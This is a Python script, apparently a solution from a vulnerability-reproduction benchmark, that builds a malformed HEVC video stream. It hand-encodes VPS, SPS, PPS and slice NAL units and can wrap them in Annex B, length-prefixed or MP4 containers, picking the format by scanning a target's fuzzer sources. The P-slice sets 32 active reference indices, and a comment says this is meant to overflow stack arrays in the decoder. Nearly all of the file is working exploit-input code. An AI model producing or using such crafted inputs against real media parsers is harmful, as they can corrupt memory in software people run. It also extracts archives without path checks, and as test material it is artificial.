import os
import re
import tarfile
import tempfile
import struct
from typing import List, Tuple, Optional


class _BitWriter:
    __slots__ = ("_buf", "_cur", "_nbits")

    def __init__(self):
        self._buf = bytearray()
        self._cur = 0
        self._nbits = 0

    def write_bits(self, v: int, n: int) -> None:
        if n <= 0:
            return
        v &= (1 << n) - 1
        while n:
            take = min(8 - self._nbits, n)
            shift = n - take
            bits = (v >> shift) & ((1 << take) - 1)
            self._cur = (self._cur << take) | bits
            self._nbits += take
            n -= take
            if self._nbits == 8:
                self._buf.append(self._cur & 0xFF)
                self._cur = 0
                self._nbits = 0

    def write_bool(self, b: bool) -> None:
        self.write_bits(1 if b else 0, 1)

    def write_ue(self, x: int) -> None:
        if x < 0:
            x = 0
        code_num = x + 1
        k = code_num.bit_length() - 1
        self.write_bits(0, k)
        self.write_bits(code_num, k + 1)

    def write_se(self, x: int) -> None:
        if x <= 0:
            code_num = -2 * x
        else:
            code_num = 2 * x - 1
        self.write_ue(code_num)

    def rbsp_trailing_bits(self) -> None:
        self.write_bits(1, 1)
        if self._nbits:
            self.write_bits(0, 8 - self._nbits)

    def get_bytes(self) -> bytes:
        return bytes(self._buf)


def _escape_rbsp_to_ebsp(rbsp: bytes) -> bytes:
    out = bytearray()
    zeros = 0
    for b in rbsp:
        if zeros >= 2 and b <= 3:
            out.append(3)
            zeros = 0
        out.append(b)
        if b == 0:
            zeros += 1
        else:
            zeros = 0
    return bytes(out)


def _hevc_nal_header(nal_type: int, layer_id: int = 0, temporal_id_plus1: int = 1) -> bytes:
    nal_type &= 0x3F
    layer_id &= 0x3F
    temporal_id_plus1 &= 0x07
    v = (nal_type << 9) | (layer_id << 3) | temporal_id_plus1
    return struct.pack(">H", v)


def _nal_unit(nal_type: int, rbsp: bytes) -> bytes:
    return _hevc_nal_header(nal_type) + _escape_rbsp_to_ebsp(rbsp)


def _profile_tier_level(w: _BitWriter, profile_idc: int = 1, level_idc: int = 120) -> None:
    w.write_bits(0, 2)  # general_profile_space
    w.write_bool(False)  # general_tier_flag
    w.write_bits(profile_idc & 0x1F, 5)  # general_profile_idc
    w.write_bits(0, 32)  # general_profile_compatibility_flag[32]
    w.write_bool(True)   # general_progressive_source_flag
    w.write_bool(False)  # general_interlaced_source_flag
    w.write_bool(False)  # general_non_packed_constraint_flag
    w.write_bool(True)   # general_frame_only_constraint_flag
    w.write_bits(0, 44)  # general_reserved_zero_44bits
    w.write_bits(level_idc & 0xFF, 8)  # general_level_idc


def _make_vps_rbsp() -> bytes:
    w = _BitWriter()
    w.write_bits(0, 4)  # vps_video_parameter_set_id
    w.write_bool(True)  # vps_base_layer_internal_flag
    w.write_bool(True)  # vps_base_layer_available_flag
    w.write_bits(0, 6)  # vps_max_layers_minus1
    w.write_bits(0, 3)  # vps_max_sub_layers_minus1
    w.write_bool(True)  # vps_temporal_id_nesting_flag
    w.write_bits(0xFFFF, 16)  # vps_reserved_0xffff_16bits
    _profile_tier_level(w, profile_idc=1, level_idc=120)
    w.write_bool(True)  # vps_sub_layer_ordering_info_present_flag
    w.write_ue(4)  # vps_max_dec_pic_buffering_minus1[0]
    w.write_ue(0)  # vps_max_num_reorder_pics[0]
    w.write_ue(0)  # vps_max_latency_increase_plus1[0]
    w.write_bits(0, 6)  # vps_max_layer_id
    w.write_ue(0)  # vps_num_layer_sets_minus1
    w.write_bool(False)  # vps_timing_info_present_flag
    w.write_bool(False)  # vps_extension_flag
    w.rbsp_trailing_bits()
    return w.get_bytes()


def _make_sps_rbsp() -> bytes:
    w = _BitWriter()
    w.write_bits(0, 4)  # sps_video_parameter_set_id
    w.write_bits(0, 3)  # sps_max_sub_layers_minus1
    w.write_bool(True)  # sps_temporal_id_nesting_flag
    _profile_tier_level(w, profile_idc=1, level_idc=120)
    w.write_ue(0)  # sps_seq_parameter_set_id
    w.write_ue(1)  # chroma_format_idc (4:2:0)
    w.write_ue(64)  # pic_width_in_luma_samples
    w.write_ue(64)  # pic_height_in_luma_samples
    w.write_bool(False)  # conformance_window_flag
    w.write_ue(0)  # bit_depth_luma_minus8
    w.write_ue(0)  # bit_depth_chroma_minus8
    w.write_ue(0)  # log2_max_pic_order_cnt_lsb_minus4 (=> 4 bits)
    w.write_bool(True)  # sps_sub_layer_ordering_info_present_flag
    w.write_ue(4)  # sps_max_dec_pic_buffering_minus1[0]
    w.write_ue(0)  # sps_max_num_reorder_pics[0]
    w.write_ue(0)  # sps_max_latency_increase_plus1[0]
    w.write_ue(0)  # log2_min_luma_coding_block_size_minus3
    w.write_ue(0)  # log2_diff_max_min_luma_coding_block_size
    w.write_ue(0)  # log2_min_luma_transform_block_size_minus2
    w.write_ue(0)  # log2_diff_max_min_luma_transform_block_size
    w.write_ue(0)  # max_transform_hierarchy_depth_inter
    w.write_ue(0)  # max_transform_hierarchy_depth_intra
    w.write_bool(False)  # scaling_list_enabled_flag
    w.write_bool(False)  # amp_enabled_flag
    w.write_bool(False)  # sample_adaptive_offset_enabled_flag
    w.write_bool(False)  # pcm_enabled_flag
    w.write_ue(1)  # num_short_term_ref_pic_sets

    # st_ref_pic_set(0): 1 negative ref, used
    w.write_ue(1)  # num_negative_pics
    w.write_ue(0)  # num_positive_pics
    w.write_ue(0)  # delta_poc_s0_minus1 (=> -1)
    w.write_bool(True)  # used_by_curr_pic_s0_flag

    w.write_bool(False)  # long_term_ref_pics_present_flag
    w.write_bool(False)  # sps_temporal_mvp_enabled_flag
    w.write_bool(False)  # strong_intra_smoothing_enabled_flag
    w.write_bool(False)  # vui_parameters_present_flag
    w.write_bool(False)  # sps_extension_present_flag
    w.rbsp_trailing_bits()
    return w.get_bytes()


def _make_pps_rbsp() -> bytes:
    w = _BitWriter()
    w.write_ue(0)  # pps_pic_parameter_set_id
    w.write_ue(0)  # pps_seq_parameter_set_id
    w.write_bool(False)  # dependent_slice_segments_enabled_flag
    w.write_bool(False)  # output_flag_present_flag
    w.write_bits(0, 3)  # num_extra_slice_header_bits
    w.write_bool(False)  # sign_data_hiding_enabled_flag
    w.write_bool(False)  # cabac_init_present_flag
    w.write_ue(0)  # num_ref_idx_l0_default_active_minus1
    w.write_ue(0)  # num_ref_idx_l1_default_active_minus1
    w.write_se(0)  # init_qp_minus26
    w.write_bool(False)  # constrained_intra_pred_flag
    w.write_bool(False)  # transform_skip_enabled_flag
    w.write_bool(False)  # cu_qp_delta_enabled_flag
    w.write_se(0)  # pps_cb_qp_offset
    w.write_se(0)  # pps_cr_qp_offset
    w.write_bool(False)  # pps_slice_chroma_qp_offsets_present_flag
    w.write_bool(False)  # weighted_pred_flag
    w.write_bool(False)  # weighted_bipred_flag
    w.write_bool(False)  # transquant_bypass_enabled_flag
    w.write_bool(False)  # tiles_enabled_flag
    w.write_bool(False)  # entropy_coding_sync_enabled_flag
    w.write_bool(False)  # pps_loop_filter_across_slices_enabled_flag
    w.write_bool(False)  # deblocking_filter_control_present_flag
    w.write_bool(False)  # pps_scaling_list_data_present_flag
    w.write_bool(False)  # lists_modification_present_flag
    w.write_ue(0)  # log2_parallel_merge_level_minus2
    w.write_bool(False)  # slice_segment_header_extension_present_flag
    w.write_bool(False)  # pps_extension_present_flag
    w.rbsp_trailing_bits()
    return w.get_bytes()


def _make_slice_rbsp(nal_type: int, slice_type: int, poc_lsb: int, overflow_refs: bool) -> bytes:
    w = _BitWriter()
    w.write_bool(True)  # first_slice_segment_in_pic_flag
    if 16 <= nal_type <= 23:
        w.write_bool(False)  # no_output_of_prior_pics_flag
    w.write_ue(0)  # slice_pic_parameter_set_id

    w.write_ue(slice_type)  # slice_type (0=B,1=P,2=I)
    w.write_bits(poc_lsb & 0xF, 4)  # slice_pic_order_cnt_lsb (log2_max_pic_order_cnt_lsb = 4)

    if nal_type not in (19, 20, 21, 22):  # not IDR/BLA etc; keep minimal and generic
        # For non-IDR: short_term_ref_pic_set_sps_flag
        w.write_bool(True)  # short_term_ref_pic_set_sps_flag (use SPS RPS 0)

    if slice_type != 2:
        w.write_bool(True)  # num_ref_idx_active_override_flag
        if overflow_refs:
            w.write_ue(31)  # num_ref_idx_l0_active_minus1 => 32 refs (overflow typical stack arrays)
        else:
            w.write_ue(0)
        w.write_ue(0)  # five_minus_max_num_merge_cand

    w.write_se(0)  # slice_qp_delta
    w.rbsp_trailing_bits()
    return w.get_bytes()


def _build_annexb_stream() -> bytes:
    vps = _nal_unit(32, _make_vps_rbsp())
    sps = _nal_unit(33, _make_sps_rbsp())
    pps = _nal_unit(34, _make_pps_rbsp())

    idr_rbsp = _make_slice_rbsp(19, slice_type=2, poc_lsb=0, overflow_refs=False)
    idr = _nal_unit(19, idr_rbsp)

    p_rbsp = _make_slice_rbsp(1, slice_type=1, poc_lsb=1, overflow_refs=True)
    psl = _nal_unit(1, p_rbsp)

    sc = b"\x00\x00\x00\x01"
    return sc + vps + sc + sps + sc + pps + sc + idr + sc + psl


def _build_length_prefixed_stream(length_size: int = 4, include_param_sets: bool = True) -> bytes:
    nals = []
    if include_param_sets:
        nals.append(_nal_unit(32, _make_vps_rbsp()))
        nals.append(_nal_unit(33, _make_sps_rbsp()))
        nals.append(_nal_unit(34, _make_pps_rbsp()))
    nals.append(_nal_unit(19, _make_slice_rbsp(19, slice_type=2, poc_lsb=0, overflow_refs=False)))
    nals.append(_nal_unit(1, _make_slice_rbsp(1, slice_type=1, poc_lsb=1, overflow_refs=True)))

    out = bytearray()
    for nal in nals:
        ln = len(nal)
        if length_size == 4:
            out += struct.pack(">I", ln)
        elif length_size == 2:
            out += struct.pack(">H", ln & 0xFFFF)
        elif length_size == 1:
            out.append(ln & 0xFF)
        else:
            out += struct.pack(">I", ln)
        out += nal
    return bytes(out)


def _mp4_box(typ: bytes, payload: bytes) -> bytes:
    return struct.pack(">I4s", 8 + len(payload), typ) + payload


def _mp4_fullbox(typ: bytes, version: int, flags: int, payload: bytes) -> bytes:
    return _mp4_box(typ, struct.pack(">B", version & 0xFF) + struct.pack(">I", flags & 0xFFFFFF)[1:] + payload)


def _build_hvcc(vps_nal: bytes, sps_nal: bytes, pps_nal: bytes, length_size_minus_one: int = 3) -> bytes:
    # General profile fields (match profile_tier_level used)
    general_profile_space = 0
    general_tier_flag = 0
    general_profile_idc = 1
    general_profile_compatibility_flags = 0
    general_constraint_indicator_flags = b"\x00\x00\x00\x00\x00\x00"
    general_level_idc = 120

    b0 = (general_profile_space << 6) | (general_tier_flag << 5) | (general_profile_idc & 0x1F)
    rec = bytearray()
    rec.append(1)  # configurationVersion
    rec.append(b0)
    rec += struct.pack(">I", general_profile_compatibility_flags)
    rec += general_constraint_indicator_flags
    rec.append(general_level_idc & 0xFF)

    rec += struct.pack(">H", 0xF000 | 0)  # min_spatial_segmentation_idc
    rec.append(0xFC | 0)  # parallelismType
    rec.append(0xFC | 1)  # chromaFormat (1)
    rec.append(0xF8 | 0)  # bitDepthLumaMinus8
    rec.append(0xF8 | 0)  # bitDepthChromaMinus8
    rec += struct.pack(">H", 0)  # avgFrameRate

    # constantFrameRate(2)=0, numTemporalLayers(3)=1, temporalIdNested(1)=1, lengthSizeMinusOne(2)=length_size_minus_one
    packed = (0 << 6) | (1 << 3) | (1 << 2) | (length_size_minus_one & 3)
    rec.append(packed & 0xFF)

    arrays = [
        (32, vps_nal),
        (33, sps_nal),
        (34, pps_nal),
    ]
    rec.append(len(arrays) & 0xFF)  # numOfArrays

    for nal_type, nal in arrays:
        rec.append(0x80 | (nal_type & 0x3F))  # array_completeness=1, reserved=0, nal_unit_type
        rec += struct.pack(">H", 1)  # numNalus
        rec += struct.pack(">H", len(nal))
        rec += nal

    return bytes(rec)


def _build_minimal_mp4_with_hevc(sample_nals: List[bytes], vps: bytes, sps: bytes, pps: bytes) -> bytes:
    # Sample data: 4-byte length prefixes
    sample_payload = bytearray()
    for nal in sample_nals:
        sample_payload += struct.pack(">I", len(nal))
        sample_payload += nal
    sample_payload = bytes(sample_payload)

    ftyp = _mp4_box(b"ftyp", b"isom" + struct.pack(">I", 0) + b"isom" + b"iso2" + b"mp41")

    # hvcC
    hvcc = _mp4_box(b"hvcC", _build_hvcc(vps, sps, pps, length_size_minus_one=3))

    # hvc1 sample entry (VideoSampleEntry)
    compressorname = bytes([0]) + b"\x00" * 31
    visual = (
        b"\x00" * 6 + struct.pack(">H", 1) +  # reserved, data_reference_index
        struct.pack(">H", 0) + struct.pack(">H", 0) +  # pre_defined, reserved
        b"\x00" * 12 +  # pre_defined[3]
        struct.pack(">H", 64) + struct.pack(">H", 64) +  # width, height
        struct.pack(">I", 0x00480000) + struct.pack(">I", 0x00480000) +  # horiz/vert resolution
        struct.pack(">I", 0) +  # reserved
        struct.pack(">H", 1) +  # frame_count
        compressorname +
        struct.pack(">H", 0x0018) + struct.pack(">H", 0xFFFF)  # depth, pre_defined
    )
    hvc1 = _mp4_box(b"hvc1", visual + hvcc)

    stsd = _mp4_fullbox(b"stsd", 0, 0, struct.pack(">I", 1) + hvc1)
    stts = _mp4_fullbox(b"stts", 0, 0, struct.pack(">I", 1) + struct.pack(">II", 1, 1))
    stsc = _mp4_fullbox(b"stsc", 0, 0, struct.pack(">I", 1) + struct.pack(">III", 1, 1, 1))
    stsz = _mp4_fullbox(b"stsz", 0, 0, struct.pack(">II", 0, 1) + struct.pack(">I", len(sample_payload)))
    # stco placeholder, fill later
    stco_placeholder = _mp4_fullbox(b"stco", 0, 0, struct.pack(">I", 1) + struct.pack(">I", 0))

    stbl = _mp4_box(b"stbl", stsd + stts + stsc + stsz + stco_placeholder)

    url = _mp4_fullbox(b"url ", 0, 1, b"")
    dref = _mp4_fullbox(b"dref", 0, 0, struct.pack(">I", 1) + url)
    dinf = _mp4_box(b"dinf", dref)

    vmhd = _mp4_fullbox(b"vmhd", 0, 1, struct.pack(">H", 0) + struct.pack(">HHH", 0, 0, 0))
    minf = _mp4_box(b"minf", vmhd + dinf + stbl)

    hdlr_name = b"VideoHandler\x00"
    hdlr = _mp4_fullbox(b"hdlr", 0, 0, struct.pack(">I4s", 0, b"vide") + b"\x00" * 12 + hdlr_name)
    mdhd = _mp4_fullbox(b"mdhd", 0, 0, struct.pack(">IIIIH2s", 0, 0, 1000, 1, 0, b"\x00\x00"))
    mdia = _mp4_box(b"mdia", mdhd + hdlr + minf)

    tkhd = _mp4_fullbox(
        b"tkhd", 0, 0x0007,
        struct.pack(">IIII", 0, 0, 1, 0) +  # creation, modification, track_id, reserved
        struct.pack(">I", 1) + struct.pack(">I", 0) +  # duration, reserved
        struct.pack(">II", 0, 0) +  # reserved
        struct.pack(">hhhh", 0, 0, 0, 0) +  # layer, alt_group, volume, reserved
        struct.pack(">9I",
                    0x00010000, 0, 0,
                    0, 0x00010000, 0,
                    0, 0, 0x40000000) +  # matrix
        struct.pack(">II", 64 << 16, 64 << 16)  # width,height in 16.16
    )
    trak = _mp4_box(b"trak", tkhd + mdia)

    mvhd = _mp4_fullbox(
        b"mvhd", 0, 0,
        struct.pack(">IIII", 0, 0, 1000, 1) +  # creation, modification, timescale, duration
        struct.pack(">I", 0x00010000) +  # rate 1.0
        struct.pack(">H", 0x0100) + struct.pack(">H", 0) +  # volume 1.0, reserved
        struct.pack(">II", 0, 0) +  # reserved
        struct.pack(">9I",
                    0x00010000, 0, 0,
                    0, 0x00010000, 0,
                    0, 0, 0x40000000) +  # matrix
        struct.pack(">6I", 0, 0, 0, 0, 0, 0) +  # pre_defined
        struct.pack(">I", 2)  # next_track_ID
    )
    moov = _mp4_box(b"moov", mvhd + trak)

    mdat = _mp4_box(b"mdat", sample_payload)

    # Patch stco offset to mdat payload start
    prefix = ftyp + moov
    mdat_header_len = 8
    chunk_offset = len(prefix) + mdat_header_len
    stco = _mp4_fullbox(b"stco", 0, 0, struct.pack(">I", 1) + struct.pack(">I", chunk_offset))

    # Rebuild moov with patched stco
    stbl2 = _mp4_box(b"stbl", stsd + stts + stsc + stsz + stco)
    minf2 = _mp4_box(b"minf", vmhd + dinf + stbl2)
    mdia2 = _mp4_box(b"mdia", mdhd + hdlr + minf2)
    trak2 = _mp4_box(b"trak", tkhd + mdia2)
    moov2 = _mp4_box(b"moov", mvhd + trak2)

    return ftyp + moov2 + mdat


def _detect_preferred_format_from_tree(root: str) -> str:
    # Returns: "mp4", "length", "annexb"
    fuzz_files = []
    for dirpath, dirnames, filenames in os.walk(root):
        lp = dirpath.lower()
        if ("fuzz" not in lp) and ("oss-fuzz" not in lp) and ("fuzzer" not in lp):
            continue
        for fn in filenames:
            lfn = fn.lower()
            if not lfn.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hpp")):
                continue
            fuzz_files.append(os.path.join(dirpath, fn))
            if len(fuzz_files) >= 200:
                break
        if len(fuzz_files) >= 200:
            break

    patterns = {
        "mp4": re.compile(r"\bgf_isom_", re.IGNORECASE),
        "annexb": re.compile(r"start[_ ]?code|annex\s*b|nalu_next_start_code|0x000001", re.IGNORECASE),
        "length": re.compile(r"lengthsize|length_size|nal[_ ]?size|hvcc|hvcC|read_be32|read_u32", re.IGNORECASE),
    }

    saw_fuzzer_entry = False
    for fp in fuzz_files:
        try:
            st = os.stat(fp)
            if st.st_size > 512 * 1024:
                continue
            with open(fp, "rb") as f:
                data = f.read(512 * 1024)
        except OSError:
            continue
        text = data.decode("utf-8", "ignore")
        if "LLVMFuzzerTestOneInput" in text or "FuzzerTestOneInput" in text:
            saw_fuzzer_entry = True
            if patterns["mp4"].search(text):
                return "mp4"
            if patterns["annexb"].search(text) and not patterns["length"].search(text):
                return "annexb"
            if patterns["length"].search(text) and not patterns["annexb"].search(text):
                return "length"

    if saw_fuzzer_entry:
        # If unsure but fuzzer found, prefer annexb (common)
        return "annexb"

    return "annexb"


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmpdir = None
        fmt = "annexb"
        try:
            tmpdir = tempfile.mkdtemp(prefix="src_")
            try:
                with tarfile.open(src_path, "r:*") as tf:
                    tf.extractall(tmpdir)
            except Exception:
                tmpdir = None

            if tmpdir is not None:
                fmt = _detect_preferred_format_from_tree(tmpdir)

        finally:
            # No cleanup to avoid issues with read-only environments; temp dirs are small.
            pass

        if fmt == "mp4":
            vps = _nal_unit(32, _make_vps_rbsp())
            sps = _nal_unit(33, _make_sps_rbsp())
            pps = _nal_unit(34, _make_pps_rbsp())
            idr = _nal_unit(19, _make_slice_rbsp(19, slice_type=2, poc_lsb=0, overflow_refs=False))
            psl = _nal_unit(1, _make_slice_rbsp(1, slice_type=1, poc_lsb=1, overflow_refs=True))
            return _build_minimal_mp4_with_hevc([idr, psl], vps, sps, pps)

        if fmt == "length":
            return _build_length_prefixed_stream(length_size=4, include_param_sets=True)

        return _build_annexb_stream()